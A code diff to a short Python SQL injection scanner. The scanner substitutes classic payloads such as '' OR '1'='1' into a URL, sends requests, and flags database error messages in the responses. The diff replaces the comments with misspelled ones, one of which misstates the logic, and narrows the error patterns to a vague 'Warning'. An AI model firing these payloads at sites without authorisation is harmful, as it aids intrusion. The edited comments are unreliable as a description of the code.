@@ -1,6 +1,6 @@
 import requests
 
-# SQLi payloads
+# Payloads given from the internet.
 PAYLOADS = [
     "' OR '1'='1",
     "' OR '1'='1' -- ",
@@ -8,22 +8,16 @@ PAYLOADS = [
     "' OR 1=1#",
 ]
 
-# Common database error patterns
+#We are looking for the server to gve back some type of information.
 ERROR_PATTERNS = [
     "You have an error in your SQL syntax",
-    "Warning: mysql_",
-    "Unclosed quotation mark",
-    "quoted string not properly terminated",
-    "SQLSTATE[HY000]",
+    "Warning",
 ]
 
+#The scan function can be called to do the things we need done. It will replace the URL in question with  our new
+#url and append the payload. If no error are found we wll prn them.
 def scan(url: str):
-    """
-    Test the given URL for SQL Injection vulnerabilities.
-    """
-
     print(f"[INFO] Starting SQLi scan on: {url}")
-
     for payload in PAYLOADS:
         # Replace 'test' placeholder with payload
         test_url = url.replace("test", payload)
@@ -31,7 +25,7 @@ def scan(url: str):
         try:
             response = requests.get(test_url, timeout=5)
 
-            # Look for SQL error patterns
+            #parse through all errors give, if any are given at all.
             for error in ERROR_PATTERNS:
                 if error.lower() in response.text.lower():
                     print(f"[VULNERABLE] Possible SQLi detected with payload: {payload}")
@@ -42,5 +36,5 @@ def scan(url: str):
 
         except requests.exceptions.RequestException as e:
             print(f"[ERROR] Request failed for payload {payload}: {e}")
-
+    #not needed but tells us that there is nothing left to do.
     print("[INFO] SQLi scan complete.")
